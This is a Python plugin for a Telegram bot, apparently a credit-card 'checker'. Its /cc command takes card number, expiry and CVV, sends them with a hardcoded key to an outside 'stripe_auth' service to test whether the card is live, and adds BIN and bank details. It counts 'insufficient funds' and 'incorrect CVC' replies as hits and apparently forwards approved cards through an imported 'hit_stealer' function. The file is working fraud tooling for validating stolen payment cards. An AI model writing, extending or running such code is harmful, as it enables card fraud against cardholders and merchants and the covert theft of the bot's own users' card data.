from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import re, time, httpx
from plugins.func.users_sql import *
from datetime import date
from plugins.tools.hit_stealer import send_hit_if_approved  # Stealer import

API_URL = "https://barryxapi.xyz/stripe_auth"
API_KEY = "BRY-HEIQ7-KPWYR-DRU67"

async def get_bin_info(bin_number: str) -> dict:
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            res = await client.get(f"https://api.voidex.dev/api/bin?bin={bin_number}")
            if res.status_code == 200:
                d = res.json()
                return {
                    "bank": d.get("bank", "UNKNOWN"),
                    "scheme": d.get("brand", "UNKNOWN").upper(),
                    "type": d.get("type", "UNKNOWN").upper(),
                    "brand": d.get("level", "UNKNOWN").upper(),
                    "country": d.get("country_name", "UNKNOWN"),
                    "flag": d.get("country_flag", "🏳️")
                }
    except:
        pass
    return {
        "bank": "UNKNOWN",
        "scheme": "UNKNOWN",
        "type": "UNKNOWN",
        "brand": "UNKNOWN",
        "country": "UNKNOWN",
        "flag": "🏳️"
    }

@Client.on_message(filters.command("cc", prefixes=["/", "."]))
async def cmd_cc(Client, message):
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        chat_type = str(message.chat.type).lower()
        username = message.from_user.username or "None"

        regdata = fetchinfo(user_id)
        if not regdata:
            insert_reg_data(user_id, username, 0, str(date.today()))
            regdata = fetchinfo(user_id)

        role = regdata[2] or "FREE"
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type == "private" and role == "FREE":
            return await message.reply_text(
                "Premium Users Required ⚠️\nJoin group for free use:",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("Join Group", url="https://t.me/BarryxChat")]]
                ),
                disable_web_page_preview=True
            )

        if chat_type in ["group", "supergroup"] and str(chat_id) not in GROUP:
            return await message.reply_text("Unauthorized chat. Contact admin.", message.id)

        if credit < 1:
            return await message.reply_text("❌ Insufficient credit.", message.id)

        if now - antispam_time < wait_time:
            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)} seconds (AntiSpam)", message.id)

        args = message.text.split(None, 1)
        if len(args) < 2 and not message.reply_to_message:
            return await message.reply_text("❌ Usage: /cc <cc|mm|yy|cvv>", message.id)

        cc = message.reply_to_message.text if message.reply_to_message else args[1].strip()
        match = re.search(r'(\d{12,16})[|:\s,-](\d{1,2})[|:\s,-](\d{2,4})[|:\s,-](\d{3,4})', cc)
        if not match:
            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv", message.id)

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply_text(f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Stripe Auth</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...
""", reply_to_message_id=message.id)

        tic = time.perf_counter()

        try:
            async with httpx.AsyncClient(timeout=25) as client:
                res = await client.get(f"{API_URL}?key={API_KEY}&card={fullcc}")
                data = res.json()
                card_status = data.get("status", "").lower()
                card_message = data.get("message") or data.get("error") or "No message"
        except:
            card_status = "error"
            card_message = "❌ Request failed or server did not return JSON."

        toc = time.perf_counter()

        bin_data = await get_bin_info(ccnum[:6])
        bank = bin_data["bank"]
        bin_type = f"{bin_data['scheme']} - {bin_data['type']} - {bin_data['brand']}"
        country = bin_data["country"]
        flag = bin_data["flag"]

        msg_lower = card_message.lower()
        if any(k in msg_lower for k in ["approved", "success", "charged", "card added", "insufficient_funds", "incorrect_cvc"]):
            status = "Approved ✅"
        elif any(k in msg_lower for k in ["declined", "pickup", "fraud", "stolen", "lost", "do not honor"]):
            status = "Declined ❌"
        elif any(k in msg_lower for k in ["counter proposal", "price of this line"]):
            status = "Unknown ❓"
        else:
            status = "Error ⚠️"

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Stripe Auth</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {bin_type}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        await Client.edit_message_text(chat_id, check_msg.id, final_msg)
        await send_hit_if_approved(Client, final_msg)

        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
